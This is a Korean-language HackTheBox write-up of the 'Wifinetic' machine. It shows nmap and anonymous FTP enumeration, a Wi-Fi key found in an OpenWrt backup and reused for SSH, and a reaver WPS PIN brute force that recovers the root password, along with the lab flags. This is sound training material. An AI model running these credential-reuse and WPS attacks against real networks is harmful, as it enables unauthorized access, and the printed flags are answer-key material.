---
title: "[HackTheBox] Wifinetic"
author: d0razi
date: 2024-01-25 10:39
categories: [InfoSec, Pentest]
tags: [Write up, HTB]
image: /assets/img/media/banner/HTB.jpg
---

# 쉘 획득
## nmap 스캔

Anonymous 로그인이 허용된 것을 확인하고 FTP 서버에 접속해서 파일을 전부 받아왔습니다.
```bash
❯ nmap -sV -sC -Pn 10.10.11.247
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-25 09:20 KST
Nmap scan report for 10.10.11.247
Host is up (0.44s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.30 seconds
```

## FTP 접속

```bash
❯ ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget MigrateOpenWrt.txt [anpqy?]?
229 Entering Extended Passive Mode (|||41036|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |***********************************************************************************************************************************************|  4434       20.76 KiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (4.89 KiB/s)
mget ProjectGreatMigration.pdf [anpqy?]?
229 Entering Extended Passive Mode (|||47915|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |***********************************************************************************************************************************************|  2442 KiB  263.49 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:09 (250.45 KiB/s)
mget ProjectOpenWRT.pdf [anpqy?]?
229 Entering Extended Passive Mode (|||43635|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |***********************************************************************************************************************************************| 60857       55.89 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:01 (46.58 KiB/s)
mget backup-OpenWrt-2023-07-26.tar [anpqy?]?
229 Entering Extended Passive Mode (|||49503|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |***********************************************************************************************************************************************| 40960       62.75 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:01 (36.16 KiB/s)
mget employees_wellness.pdf [anpqy?]?
229 Entering Extended Passive Mode (|||45813|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |***********************************************************************************************************************************************| 52946       61.46 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:01 (38.12 KiB/s)
```

## 정보 수집
backup-OpenWrt-2023-07-26.tar 파일 압축 풀고 각 파일을 하나 하나 확인해보던 중 `/config/wireless` 파일에서 비밀번호 같아 보이는 문자열을 찾았습니다.
```

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

그리고 passwd 파일에서 netadmin 이라는 유저가 있는 걸 확인하고 ssh 에 연결을 시도했더니 성공했습니다.
```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

```bash
❯ sshpass -p VeRyUniUqWiFIPasswrd1! ssh netadmin@10.10.11.247
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 25 Jan 2024 04:12:17 AM UTC

  System load:            0.4
  Usage of /:             64.3% of 4.76GB
  Memory usage:           6%
  Swap usage:             0%
  Processes:              256
  Users logged in:        1
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:1054
  IPv4 address for wlan0: 192.168.1.1

Last login: Thu Jan 25 04:11:51 2024 from 10.10.14.6
netadmin@wifinetic:~$ cat user.txt
955612591287b8c99c307cb4909179ff
```

# 권한 상승
linpeas.sh 쉘 스크립트에서 `cap_net_raw+ep` 가 설정된 바이너리들을 봤습니다. 그 중에서 reaver라는 툴에도 설정 되어 있던 것을 확인했습니다.
```bash
══╣ Parent process capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

reaver 에 대해서 찾아보니 WPA/WPA2 암호 무차별 대입 공격 툴이였습니다.

machine info에서 보면 WPS PIN을 무차별 대입 공격으로 알아내서 PSK를 얻어야 한다는 것을 보고 `iwconfig` 로 무선 네트워크 인터페이스를 확인해봤습니다.

```bash
netadmin@wifinetic:~$ iwconfig
wlan0 IEEE 802.11 Mode:Master Tx-Power=20 dBm
 Retry short limit:7 RTS thr:off Fragment thr:off
 Power Management:on

hwsim0 no wireless extensions.
lo no wireless extensions.
eth0 no wireless extensions.
wlan2 IEEE 802.11 ESSID:off/any
 Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm
 Retry short limit:7 RTS thr:off Fragment thr:off
 Power Management:on

mon0 IEEE 802.11 Mode:Monitor Tx-Power=20 dBm
 Retry short limit:7 RTS thr:off Fragment thr:off
 Power Management:on

wlan1 IEEE 802.11 ESSID:"OpenWrt"
 Mode:Managed Frequency:2.412 GHz Access Point: 02:00:00:00:00:00
 Bit Rate:54 Mb/s Tx-Power=20 dBm
 Retry short limit:7 RTS thr:off Fragment thr:off
 Power Management:on
 Link Quality=70/70 Signal level=-30 dBm
 Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0
 Tx excessive retries:0 Invalid misc:8 Missed beacon:0
```

공격 대상 AP인 `wlan`의 BSSID는 `02:00:00:00:00:00` 입니다.
```
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv
Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.

netadmin@wifinetic:~$ su -
Password:

root@wifinetic:~# ls
root.txt snap

root@wifinetic:~# cat root.txt
135f3941f9fd3ac7d1b230893d656b97
```